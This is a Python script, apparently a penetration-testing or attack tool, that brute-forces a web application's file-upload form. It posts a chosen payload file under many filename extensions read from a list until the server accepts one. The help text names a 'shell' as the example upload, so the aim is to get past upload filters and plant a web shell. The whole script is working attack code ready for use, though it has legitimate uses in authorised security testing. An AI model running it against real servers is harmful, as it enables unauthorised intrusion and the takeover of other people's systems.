#!/usr/bin/env python3
import requests
import random
import string
import argparse

def generate_boundary():
    return "----WebKitFormBoundary" + ''.join(random.choices(string.ascii_letters + string.digits, k=16))

def multi_part_boundary(param_name, filename, content, boundary, content_type="text/plain"):
    lines = [
        f"--{boundary}",
        f'Content-Disposition: form-data; name="{param_name}"; filename="{filename}"',
        f"Content-Type: {content_type}",
        "",
        content,
        f"--{boundary}--",
        ""
    ]
    return "\r\n".join(lines)

def send_request(url, param_name, file_path, extensions, success_message):
    try:
        with open(file_path, 'r') as f:
            payload_content = f.read()
    except Exception as e:
        print(f"ERROR > {e}")
        return

    for ext in extensions:
        boundary = generate_boundary()
        file_name = file_path + ext
        body = multi_part_boundary(param_name, file_name, payload_content, boundary)
        headers = {
            "Content-Type": f"multipart/form-data; boundary={boundary}"
        }
        try:
            response = requests.post(url, headers=headers, data=body.encode())
            if response.status_code == 200:
                print(f"HIT {file_name} > 200")
                decoded_response = response.content.decode()
                if success_message:
                    if success_message in decoded_response:
                        print(f"SUCCESS! Found success message in {file_name}!")
                        return  # Exit early if you want to stop at first success
            else:
                print(f"Tried {file_name} > {response.status_code}")
        except Exception as e:
            print(f"ERROR with {file_name} > {e}")

def read_extensions(file_path):
    try:
        with open(file_path, 'r') as file:
            return [line.strip() for line in file if line.strip()]
    except Exception as e:
        print(f"Error reading extensions file '{file_path}': {e}")
        return []

def main():
    parser = argparse.ArgumentParser(description="Multipart Brute-Force Script")
    parser.add_argument("url", help="Target URL")
    parser.add_argument("-p", "--paramname", required=True, help="Form parameter name (e.g., 'file' or 'image')")
    parser.add_argument("-f", "--file", required=True, help="File to upload/test (e.g., 'shell')")
    parser.add_argument("-x", "--extensionsfile", help="Path to text file with extensions list (optional)")
    parser.add_argument("-sm", "--success-message", help="Search for specified success message")

    args = parser.parse_args()

    extensions_file = args.extensionsfile if args.extensionsfile else 'modules/extensions.txt'
    extensions = read_extensions(extensions_file)
    if not extensions:
        print("No extensions loaded. Exiting.")
        return

    send_request(args.url, args.paramname, args.file, extensions, args.success_message)

if __name__ == "__main__":
    main()